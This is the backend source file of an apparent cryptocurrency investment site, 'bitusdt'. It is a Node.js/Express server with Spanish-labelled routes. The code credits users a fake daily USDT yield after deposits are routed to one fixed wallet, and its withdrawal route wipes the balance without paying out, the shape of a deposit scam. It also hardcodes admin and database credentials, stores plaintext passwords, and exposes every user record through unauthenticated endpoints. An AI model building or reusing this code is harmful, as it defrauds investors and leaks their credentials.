const express=require("express");
const mongoose=require("mongoose");
const app=express();

app.use(express.json());
app.use(express.static("public"));

mongoose.connect(process.env.MONGO_URI || 
"mongodb+srv://bitusdt:bitusdt123@cluster0.mongodb.net/bitusdt");

const User=mongoose.model("User",{
 email:String,
 password:String,
 saldo:{type:Number,default:0},
 dias:{type:Number,default:0},
 activo:{type:Boolean,default:false},
 wallet:String
});

const Solicitud=mongoose.model("Solicitud",{
 email:String,
 monto:Number,
 estado:{type:String,default:"pendiente"}
});

/* LOGIN */
app.post("/api/login",async(req,res)=>{
const {email,password}=req.body;

if(email=="Binancecoin958@gmail.com" && password=="Enriique1998"){
 return res.json({admin:true});
}

const u=await User.findOne({email,password});
if(!u) return res.json({msg:"Datos incorrectos"});
res.json(u);
});

/* REGISTRO */
app.post("/api/register",async(req,res)=>{
await User.create(req.body);
res.json({msg:"Cuenta creada"});
});

/* INVERTIR */
app.post("/api/invert",async(req,res)=>{
await Solicitud.create({
 email:req.body.email,
 monto:req.body.monto
});
res.json({msg:"Solicitud enviada"});
});

/* VER SOLICITUDES */
app.get("/api/solicitudes",async(req,res)=>{
res.json(await Solicitud.find({estado:"pendiente"}));
});

/* APROBAR */
app.post("/api/aprobar",async(req,res)=>{
await Solicitud.findByIdAndUpdate(req.body.id,{estado:"ok"});
await User.updateOne(
 {email:req.body.email},
 {$set:{activo:true,wallet:"TXDiTXnPUV3th3rHtZaX4XqzdJeVLbJeVo"}}
);
res.json({ok:true});
});

/* GANANCIA DIARIA */
setInterval(async()=>{
const users=await User.find({activo:true});
users.forEach(async u=>{
 if(u.dias<20){
  u.dias++;
  u.saldo++;
  await u.save();
 }
});
},86400000);

/* RETIRO */
app.post("/api/retirar",async(req,res)=>{
const u=await User.findOne({email:req.body.email});
if(u.saldo<20) return res.json({msg:"Min 20 USDT"});
u.saldo=0;
u.dias=0;
u.activo=false;
await u.save();
res.json({ok:true});
});

/* USERS ADMIN */
app.get("/api/users",async(req,res)=>{
res.json(await User.find());
});

app.listen(3000,()=>console.log("OK 3000"));
